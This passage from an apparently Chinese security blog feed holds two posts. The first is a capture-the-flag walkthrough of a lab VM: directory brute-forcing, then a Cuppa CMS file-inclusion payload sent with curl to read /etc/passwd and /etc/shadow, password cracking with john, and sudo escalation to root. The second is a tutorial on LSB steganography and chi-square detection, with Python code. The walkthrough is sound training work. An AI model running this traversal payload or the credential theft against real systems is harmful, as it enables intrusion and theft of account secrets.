title="image-20240422004253217"><p>为apache服务器的默认页</p><p>使用gobuster进行目录爆破，字典使用kali自带的即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gobuster dir -u http://192.168.43.11 --wordlist=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure><p>观察一下扫描到的目录</p><img src="/posts/46fa4fea2ae0/image-20240422104021911.webp" class="" title="image-20240422104021911"><p>存在wordpress目录，所以可能使用了wordpress这个博客CMS</p><p>访问一下<code>192.168.43.11/wordpress</code>(Ctrl+左键点击扫描结果会自动打开浏览器)，结果跳转到了<code>localhost/wordpress</code></p><img src="/posts/46fa4fea2ae0/image-20240422104221432.webp" class="" title="image-20240422104221432"><p>查看一下<code>administrator</code>目录，成功访问</p><img src="/posts/46fa4fea2ae0/image-20240422104848254.webp" class="" title="image-20240422104848254"><p>现在得到的信息分别是wordpressCMS和CuppaCMS</p><p>点击<code>administrator</code>页面上的Next按钮，进入安装配置页面</p><img src="/posts/46fa4fea2ae0/image-20240422105424497.webp" class="" title="image-20240422105424497"><p>这里数据库名称和密码就设置为<code>R1ck</code>，Email<code>test@gmail.com</code></p><p>查看管理员账号的用户名密码提示，提示均为admin</p><img src="/posts/46fa4fea2ae0/image-20240422110018258.webp" class="" title="image-20240422110018258"><p>点击下一步，提示管理员用户创建失败</p><img src="/posts/46fa4fea2ae0/image-20240422110139152.webp" class="" title="image-20240422110139152"><h3 id="Cuppa-CMS"><a href="#Cuppa-CMS" class="headerlink" title="Cuppa CMS"></a>Cuppa CMS</h3><p>在kali中搜索一下Cuppa CMS可能存在的漏洞</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit cuppa</span><br></pre></td></tr></table></figure><img src="/posts/46fa4fea2ae0/image-20240422110431131.webp" class="" title="image-20240422110431131"><p>仅存在一条记录，将其下载下来</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit cuppa -m 25971</span><br></pre></td></tr></table></figure><img src="/posts/46fa4fea2ae0/image-20240422110844377.webp" class="" title="image-20240422110844377"><p>查看漏洞信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat 25971.txt</span><br></pre></td></tr></table></figure><img src="/posts/46fa4fea2ae0/image-20240422111153337.webp" class="" title="image-20240422111153337"><p>该漏洞为远程文件漏洞，漏洞位置为<code>/alerts/alertConfigField.php</code>文件，注入点为<code>urlConfig</code>参数</p><img src="/posts/46fa4fea2ae0/image-20240422112122819.webp" class="" title="image-20240422112122819"><p>描述中提示可以进行<strong>远程或本地文件包含</strong>，同时还能<strong>读取非php文件</strong></p><p>尝试提供的payload</p><p><code>http://192.168.43.11/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</code></p><img src="/posts/46fa4fea2ae0/image-20240422112429798.webp" class="" title="image-20240422112429798"><p>路径错误，我们重新构造一下，推断该靶机中将cuppa文件夹重命名为administrator</p><p>所以构造payload<code>http://192.168.43.11/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</code></p><img src="/posts/46fa4fea2ae0/image-20240422112637177.webp" class="" title="image-20240422112637177"><p>这一次有了回显，不过并没有读取到密钥文件</p><p>我们重新审计一下cuppa CMS源码</p><img src="/posts/46fa4fea2ae0/image-20240422122607472.webp" class="" title="image-20240422122607472"><p>使用的是post传参，说明该CMS的代码更新过，我们使用<code>curl</code>指令来指定post参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://192.168.43.11/administrator/alerts/alertConfigField.php </span><br></pre></td></tr></table></figure><img src="/posts/46fa4fea2ae0/image-20240422123024745.webp" class="" title="image-20240422123024745"><p>passwd文件里面所有账户的密码都是用x代替的，真正的密码（加密后）放在/etc/shadow中，同样的curl方法，我们改一下参数，查看etc/shadow文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --data-urlencode urlConfig=../../../../../../../../../etc/shadow http://192.168.43.11/administrator/alerts/alertConfigField.php </span><br></pre></td></tr></table></figure><img src="/posts/46fa4fea2ae0/image-20240422123219083.webp" class="" title="image-20240422123219083"><p>保存到<code>shadow.hash</code>，仅保留密码为哈希值的用户</p><p>在vim编辑器中，使用esc模式下的<code>dd</code>指令可以快速删除光标那一行的内容</p><img src="/posts/46fa4fea2ae0/image-20240422123527185.webp" class="" title="image-20240422123527185"><h3 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h3><p>将<code>shadow.hash</code>文件丢给john工具来破解</p><img src="/posts/46fa4fea2ae0/image-20240422130145782.webp" class="" title="image-20240422130145782"><p>共爆破出两个密码，root的密码爆破了5分钟还没出来，可以放弃</p><p>www-data一般是功能性账号，所以我们主要关注w1r3s这个账号</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>远程ssh连接到w1r3s账户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ssh w1r3s@192.168.43.11</span><br></pre></td></tr></table></figure><p>输入密码<code>computer</code>，登录成功</p><img src="/posts/46fa4fea2ae0/image-20240422130518733.webp" class="" title="image-20240422130518733"><p>查看当前用户是什么系统级权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><img src="/posts/46fa4fea2ae0/image-20240422130709201.webp" class="" title="image-20240422130709201"><p>提示当前用户有全部权限，即当前用户基本就是root账户了</p><p>我们启动root的bash会话<code>sudo /bin/bash</code>，提权成功</p><img src="/posts/46fa4fea2ae0/image-20240422130906776.webp" class="" title="image-20240422130906776"><p>浏览root目录下的文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /root</span><br></pre></td></tr></table></figure><p>找到flag文件</p><img src="/posts/46fa4fea2ae0/image-20240422131157922.webp" class="" title="image-20240422131157922">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>LSB 隐写算法实现与卡方检测</title>
      <link href="/posts/55270c628aa8/"/>
      <url>/posts/55270c628aa8/</url>
      
        <content type="html"><![CDATA[<h2 id="LSB隐写算法的基本实现"><a href="#LSB隐写算法的基本实现" class="headerlink" title="LSB隐写算法的基本实现"></a>LSB隐写算法的基本实现</h2><h3 id="LSB隐写原理"><a href="#LSB隐写原理" class="headerlink" title="LSB隐写原理"></a>LSB隐写原理</h3><div class="note info flat"><p><strong>LSB</strong>全称为 Least Significant Bit（最低有效位），是一种常被用做图片隐写的算法。LSB属于空域算法中的一种，是将信息嵌入到图像点中像素位的最低位，以保证嵌入的信息是不可见的，但是由于使用了图像不重要的像素位，算法的鲁棒性差，水印信息很容易为滤波、图像量化、几何变形的操作破坏。</p></div><p>图像在取样和量化后，可以存储为一个了 M 行 N 列的数字图像$I(x,y)$（二维矩阵）如下：</p><p>$I(x,y) = \begin{bmatrix} I(0,0) &amp; I(0,1) &amp; \cdots &amp; I(0,N-1) \ I(1,0) &amp; I(1,1) &amp; \cdots &amp; I(1,N-1) \ \vdots &amp; \vdots &amp; \ddots &amp; \vdots \ I(M-1,0) &amp; I(M-1,1) &amp; \cdots &amp; I(M-1,N-1) \ \end{bmatrix} $</p><p>在灰度图像中任意的 $I(x,y)$都存储了对应这一点的二进制八位的灰度值（RGB 图像则是对应的三通道彩色像素值）</p><p>要实现LSB隐写算法，首先将需要隐藏的信息转换为二进制形式。然后，遍历图像的每个像素，将信息的二进制位依次嵌入到像素值的最低位中。例如，如果要隐藏的信息是一个二进制序列<code>1011</code>，那么算法将取图像的前四个像素（对于灰度图像）或第一个像素的RGB三个通道加一个额外通道（对于彩色图像），并将每个像素（或通道）的最低位修改为该二进制序列的一个位。</p><img src="/posts/55270c628aa8/image-20240324135824651.png" class="" title="image-20240324135824651"><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><h4 id="信息与二进制互相转换"><a href="#信息与二进制互相转换" class="headerlink" title="信息与二进制互相转换"></a>信息与二进制互相转换</h4><p>在LSB隐写中，信息是以二进制的形式嵌入在图像中，所以无论是隐写还是从图像中提取信息，都会涉及到<strong>信息（字符串）与二进制的相互转换</strong></p><p>首先，信息转换成二进制的功能通过<code>message_to_bin</code>函数实现。该函数接收一个字符串作为输入，并将每个字符转换成其ASCII编码的二进制表示，最后将这些二进制字符串连接起来形成一个长的二进制序列</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">message_to_bin</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;将消息转为二进制编码&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    binary = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">format</span>(<span class="built_in">ord</span>(i), <span class="string">&quot;08b&quot;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> message])</span><br><span class="line">    <span class="keyword">return</span> binary</span><br></pre></td></tr></table></figure><p>我们使用<code>&quot;08b&quot;</code>的形式使最后的二进制编码为8位，前面不足的位数补零</p><p>将二进制转为字符串时，我们将二进制编码先分为8位长度的块，每个块代表字符串中的一个字符，然后用<code>chr()</code>强转为字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">bin_to_message</span>(<span class="params">binary</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;将二进制编码转为消息&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    message = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(binary[i:i+<span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary), <span class="number">8</span>)])</span><br><span class="line">    <span class="keyword">return</span> message</span><br></pre></td></tr></table></figure><h4 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h4><p>为了方便从隐写图像中提取信息，我们需要在隐写时在嵌入的信息末尾加上结束符</p><p>这里我们使用<code>8*n_bits</code>个<code>1</code>和<code>n_bits</code>个0作为结束符，这样嵌入的像素个数为整数，而且由于一长串的 <code>1</code> 后跟几个 <code>0</code>在正常的文本转换为二进制后的模式中很少出现，所以非常适合作为结束符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用结束符来标记消息的结束</span></span><br><span class="line">delimiter = <span class="string">&#x27;1&#x27;</span> * (n_bits * <span class="number">8</span>) + <span class="string">&#x27;0&#x27;</span> * n_bits</span><br><span class="line">binary_message = message_to_bin(message) + delimiter</span><br><span class="line"><span class="comment"># 将二进制编码分割为 n_bits 位的块</span></span><br><span class="line">bit_chunks = [<span class="built_in">int</span>(binary_message[i:i+n_bits], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary_message), n_bits)]</span><br></pre></td></tr></table></figure><p>接下来我们将图像的像素值转为二进制编码，并最后 n_bits 位替换为消息的二进制编码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> index, pixel <span class="keyword">in</span> np.ndenumerate(pixels):</span><br><span class="line">    <span class="keyword">if</span> data_index &lt; <span class="built_in">len</span>(bit_chunks):</span><br><span class="line">        <span class="comment"># 将原图像的像素值的最后 n_bits 位替换为消息的二进制编码</span></span><br><span class="line">        mask = ~((<span class="number">1</span> &lt;&lt; n_bits) - <span class="number">1</span>)</span><br><span class="line">        bits = bit_chunks[data_index]</span><br><span class="line">        new_pixel = (pixel &amp; mask) | bits</span><br><span class="line">        new_pixels[index] = new_pixel</span><br><span class="line">        data_index += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h4 id="提取信息"><a href="#提取信息" class="headerlink" title="提取信息"></a>提取信息</h4><p>当我们从灰度图像中提取隐藏的消息时，需要先将图像的每个像素值中获取后n_bits位，并将它们串起来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> pixel <span class="keyword">in</span> np.nditer(pixels):</span><br><span class="line">    <span class="comment"># 确保从每个像素提取的消息为 n_bits 位</span></span><br><span class="line">    binary_message += <span class="built_in">format</span>(pixel &amp; ((<span class="number">1</span> &lt;&lt; n_bits) - <span class="number">1</span>), <span class="string">f&#x27;0<span class="subst">&#123;n_bits&#125;</span>b&#x27;</span>)</span><br></pre></td></tr></table></figure><p>接下来找到消息末尾的结束符，并从该处截断消息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 找到结束符，并从该处截断消息</span></span><br><span class="line">delimiter = <span class="string">&#x27;1&#x27;</span> * (n_bits * <span class="number">8</span>) + <span class="string">&#x27;0&#x27;</span> * n_bits</span><br><span class="line">delimiter_index = binary_message.find(delimiter)</span><br><span class="line">binary_message = binary_message[:delimiter_index]</span><br></pre></td></tr></table></figure><h3 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h3><p>测试图片我们选择使用数字图像处理领域的经典样本<code>Lena</code>（灰度图，256*256分辨率）</p><p>较低分辨率是为了使得测试信息更好地散布在更多比例的像素点上</p><p>原图如下</p><p><style>.xjgbetjgqjhk{zoom:200%;}</style><img src="/posts/55270c628aa8/lena-17113699645332.png" class="xjgbetjgqjhk" alt="lena"></p><p>首先我们向图片的最低位嵌入信息<code>Hello, My name is R1ck. Welcome to R1ck&#39;s Portal! Can you catch the flag?</code></p><img src="/posts/55270c628aa8/image-20240325214553903.png" class="" title="image-20240325214553903"><p>成功提取出嵌入的字符串</p><p>我们试着比较一下嵌入不同位数对隐写图像在视觉上的影响</p><img src="/posts/55270c628aa8/image-20240325211347532.png" class="" title="image-20240325211347532"><p>可以发现当我们将消息嵌入在后4位以内时，<strong>图像在视觉上变化不大</strong></p><h2 id="用卡方分布检测进行隐写分析"><a href="#用卡方分布检测进行隐写分析" class="headerlink" title="用卡方分布检测进行隐写分析"></a>用卡方分布检测进行隐写分析</h2><h3 id="卡方分布检测原理"><a href="#卡方分布检测原理" class="headerlink" title="卡方分布检测原理"></a>卡方分布检测原理</h3><p>灰度直方图是关于图像灰度级分布的函数，它将数字图像中的所有像素，按照灰度值的大小，统计其出现的次数，即图像中具有某种灰度级的像素的个数。在原始图像（灰度值为0-255）中，相邻灰度值的像素块数目一般差别很大。但在 LSB 信息隐藏中，秘密信息在嵌人之前往往经过加密，可以看作是 0、1 随机分布的比特流，而且值为 0 与 1 的可能性都是1/2。如果秘密信息完全替代载体图像的最低位，那么伪装对象相邻灰度值的像素块数目将会比较接近，这个被称之为“值对效应”。我们就可以根据这个性质判断图像是否经过隐写。如下图可以看到，经过 LSB 隐写的灰度图像出现了更多的“回削峰”</p><img src="/posts/55270c628aa8/image-20240325211652401.png" class="" title="image-20240325211652401"><p><strong>卡方检验</strong>用于统计样本的实际观测值与理论推断值之间的偏离程度，实际观测值与理论推断值之间的偏离程度就决定卡方值的大小，如果卡方值越大，二者偏差程度越大；反之，二者偏差越小；若两个值完全相等时，卡方值就为 0，表明理论值完全符合。</p><p>设图像中灰度值为 j 的像素数为 h(j) , 其中 0 ≤ j ≤ 255。灰度直方图横坐标为 j ，纵坐标为 h (j) 。如果载体图像未经隐写，h(2i) 和 h(2i+1) 的值会相差得很远，如果秘密信息完全替代载体图像的最低位,那么 h(2i) 和 h(2i+1) 的值会比较接近。嵌入信息会改变灰度直方图的分布，由差别很大变得近似相等,但是却不会改变 h(2i) + h(2i+1) 的值,因为样值要么不改变，要么就在 h(2i) 和 h(2i+1) 之间改变。</p><h3 id="比较灰度直方图"><a href="#比较灰度直方图" class="headerlink" title="比较灰度直方图"></a>比较灰度直方图</h3><p>首先使用<code>cv2</code>库中的<code>calcHist</code>函数计算出原图和隐写图片的灰度直方图，并展示在一起</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">img_ori = cv2.imread(ori_path, cv2.IMREAD_GRAYSCALE)</span><br><span class="line">img_steg_n1 = cv2.imread(save_path1, cv2.IMREAD_GRAYSCALE)</span><br><span class="line"></span><br><span class="line">hist_ori = cv2.calcHist([img_ori], [<span class="number">0</span>], <span class="literal">None</span>, [<span class="number">256</span>], [<span class="number">0</span>,<span class="number">256</span>]).flatten()</span><br><span class="line">hist_stego = cv2.calcHist([img_steg_n1], [<span class="number">0</span>], <span class="literal">None</span>, [<span class="number">256</span>], [<span class="number">0</span>,<span class="number">256</span>]).flatten()</span><br><span class="line"></span><br><span class="line">fig, axs = plt.subplots(<span class="number">2</span>, <span class="number">1</span>, figsize=(<span class="number">8</span>, <span class="number">6</span>))</span><br><span class="line"></span><br><span class="line">axs[<span class="number">0</span>].bar(<span class="built_in">range</span>(<span class="number">256</span>), hist_ori, color=<span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">axs[<span class="number">0</span>].set_title(<span class="string">&#x27;Original Image Histogram&#x27;</span>)</span><br><span class="line">axs[<span class="number">0</span>].set_xlim([<span class="number">0</span>, <span class="number">255</span>])</span><br><span class="line"></span><br><span class="line">axs[<span class="number">1</span>].bar(<span class="built_in">range</span>(<span class="number">256</span>), hist_stego, color=<span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">axs[<span class="number">1</span>].set_title(<span class="string">&#x27;Stego Image Histogram&#x27;</span>)</span><br><span class="line">axs[<span class="number">1</span>].set_xlim([<span class="number">0</span>, <span class="number">255</span>])</span><br><span class="line"></span><br><span class="line">plt.tight_layout()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>得到的对比图像如下</p><img src="/posts/55270c628aa8/histogram.png" class="" title="histogram"><p>可以看到红框圈出的位置确实出现了<strong>削峰现象</strong></p><h3 id="计算r和p值"><a href="#计算r和p值" class="headerlink" title="计算r和p值"></a>计算r和p值</h3><p>偏差r服从卡方分布</p><p>$ h<em>{2i}^* = \frac{h</em>{2i} + h<em>{2i+1}}{2}, \quad q = \frac{h</em>{2i} - h_{2i+1}}{2}$</p><p>$r = \sum<em>{i=1}^{k} \left(\frac{(h</em>{2i} - h<em>{2i}^*)^2}{ h</em>{2i}^*}\right)$</p><p>我们使用循环遍历灰度值对，累加卡方值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 遍历灰度值对，计算卡方值</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>, <span class="number">2</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> i + <span class="number">1</span> &gt;= <span class="number">256</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># 计算每对的像素总数</span></span><br><span class="line">    pair_total = hist[i] + hist[i + <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> pair_total == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span>  <span class="comment"># 避免除以0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算并累加卡方值</span></span><br><span class="line">    r += ((hist[i] - hist[i + <span class="number">1</span>]) ** <span class="number">2</span>) / pair_total / <span class="number">2</span></span><br><span class="line">    k += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>结合卡方分布的密度计算函数，我们可以计算载体被隐写的可能性p</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">1</span> - chi2.cdf(r, k - <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>这里使用的是<code>scipy</code>库中的计算卡方分布累积分布函数的方法<code>chi2.cdf</code></p><p>我们分别计算原图以及上一个任务的隐写图像的r和p值</p><img src="/posts/55270c628aa8/image-20240326104825495.png" class="" title="image-20240326104825495"><p>可以发现相较于原图，隐写图像的r值有所下降，说明经过载密后载体含有秘密信息的可能性变大</p><p>而可能性p值增加的不那么明显</p><p>经过分析，我认为可能有两点原因：</p><ol><li>之前测试时在图像中嵌入的<strong>信息长度太短，嵌入率太低</strong></li><li>嵌入的字符串转化成的二进制编码中的<strong>0和1的分布不太接近</strong></li></ol><h3 id="比较不同嵌入率下r和p的变化规律"><a href="#比较不同嵌入率下r和p的变化规律" class="headerlink" title="比较不同嵌入率下r和p的变化规律"></a>比较不同嵌入率下r和p的变化规律</h3><p>根据上一步的结论，我认为增大嵌入率后，p值能够有明显的变化</p><p>这里我们直接使用<code>random</code>库来生成随机的二进制编码序列</p><p>分别生成嵌入率为50%和100%的隐写图像并分析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pix_num = img_ori.shape[<span class="number">0</span>] * img_ori.shape[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成长度为图像分辨率1/2的随机二进制编码</span></span><br><span class="line">binary_half = <span class="string">&#x27;&#x27;</span>.join(random.choices(<span class="string">&#x27;01&#x27;</span>, k=pix_num // <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成长度为图像分辨率的随机二进制编码</span></span><br><span class="line">binary_full = <span class="string">&#x27;&#x27;</span>.join(random.choices(<span class="string">&#x27;01&#x27;</span>, k=pix_num - <span class="number">9</span>))</span><br><span class="line"></span><br><span class="line">img_steg_half_pixels , _ =hide_message_in_image(ori_path, binary=binary_half, n_bits=<span class="number">1</span>)</span><br><span class="line">img_steg_half = img_steg_half_pixels.reshape((img_ori.shape[<span class="number">0</span>], img_ori.shape[<span class="number">1</span>]))</span><br><span class="line">img_steg_full_pixels , _ = hide_message_in_image(ori_path, binary=binary_full, n_bits=<span class="number">1</span>)</span><br><span class="line">img_steg_full = img_steg_full_pixels.reshape((img_ori.shape[<span class="number">0</span>], img_ori.shape[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hist_half = cv2.calcHist([img_steg_half], [<span class="number">0</span>], <span class="literal">None</span>, [<span class="number">256</span>], [<span class="number">0</span>,<span class="number">256</span>]).flatten()</span><br><span class="line">hist_full = cv2.calcHist([img_steg_full], [<span class="number">0</span>], <span class="literal">None</span>, [<span class="number">256</span>], [<span class="number">0</span>,<span class="number">256</span>]).flatten()</span><br><span class="line"></span><br><span class="line">r_half, p_half = calculate_r_and_p(hist_half)</span><br><span class="line">r_full, p_full = calculate_r_and_p(hist_full)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;嵌入率50%时的r值: <span class="subst">&#123;r_half&#125;</span>, P值: <span class="subst">&#123;p_half&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;嵌入率100%时的r值: <span class="subst">&#123;r_full&#125;</span>, P值: <span class="subst">&#123;p_full&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>运行结果如下</p><img src="/posts/55270c628aa8/image-20240326105712635.png" class="" title="image-20240326105712635"><p>可以发现嵌入率在100%时，p值能达到99%，说明p值对嵌入的检测还是较为敏感的</p><p>嵌入的信息确实使得相邻灰度值的数量变得接近</p><p>下面我们比较一下不同嵌入率下的平均r值和p值（从0到100%，间隔2%）</p><img src="/posts/55270c628aa8/image-20240326105934906.png" class="" title="image-20240326105934906"><p>可以发现图中的曲线虽然在部分区域有震荡，但总体上r值随嵌入率的增加呈降低趋势，而p值呈上升趋势</p><p>在嵌入率到50%之前，p值上升的较为缓慢，而嵌入率到80%之后，p值稳定在95%以上</p><h2 id="LSB-的改进"><a href="#LSB-的改进" class="headerlink" title="LSB 的改进"></a>LSB 的改进</h2><h3 id="随机LSB替换"><a href="#随机LSB替换" class="headerlink" title="随机LSB替换"></a>随机LSB替换</h3><p>随机LSB替换将嵌入位置改为约定好的随机位置，这样可以有效降低对统计特性的影响</p><img src="/posts/55270c628aa8/image-20240326112354621.png" class="" title="image-20240326112354621"><p>我们只需改进原来算法中的遍历像素值的部分</p><p>通过设置随机种子seed，我们可以确保提取时产生相同的随机序列</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置随机种子以确保过程可重复</span></span><br><span class="line">random.seed(seed)</span><br><span class="line"><span class="comment"># 生成随机替换的像素索引</span></span><br><span class="line">indices = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="built_in">len</span>(flat_pixels)))</span><br><span class="line">random.shuffle(indices)</span><br><span class="line">indices = indices[:<span class="built_in">len</span>(bit_chunks)]</span><br></pre></td></tr></table></figure><p>使用<code>random.shffle</code>方法，我们可以获得一个随机的迭代器</p><h3 id="LSBM"><a href="#LSBM" class="headerlink" title="LSBM"></a>LSBM</h3><p>相比于随机LSB替换从秘密消息的散布上下手，LSBM算法则是<strong>从值对现象本身出发</strong></p><p>如果载体图像被选定的、待嵌入的像素点的LSB 与二进制形式的秘密信息不同，则对该 LSB 任意地+1 或者-1，以</p><p>防止攻击者的“值对”分析</p><p>这里我们只需改进原版LSB算法修改像素点的部分</p><p>当待嵌入的像素点的LSB 与二进制形式的秘密信息不同时，使用<code>random.randint</code>函数选择加一或减一操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> data_index, bit <span class="keyword">in</span> <span class="built_in">enumerate</span>(bit_chunks):</span><br><span class="line">    pixel_value = new_pixels[data_index]</span><br><span class="line">    bit_to_hide = <span class="built_in">int</span>(bit, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> pixel_value % <span class="number">2</span> != bit_to_hide:</span><br><span class="line">        <span class="keyword">if</span> random.randint(<span class="number">0</span>, <span class="number">1</span>) == <span class="number">1</span>:</span><br><span class="line">            <span class="comment"># 确保加1后不超过255</span></span><br><span class="line">            <span class="keyword">if</span> pixel_value &lt; <span class="number">255</span>:</span><br><span class="line">                new_pixels[data_index] += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                new_pixels[data_index] -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 确保减1后不小于0</span></span><br><span class="line">            <span class="keyword">if</span> pixel_value &gt; <span class="number">0</span>:</span><br><span class="line">                new_pixels[data_index] -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                new_pixels[data_index] += <span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>首先我们测试一下这两种改进算法能否嵌入信息以及提取信息</p><img src="/posts/55270c628aa8/image-20240326143411235.png" class="" 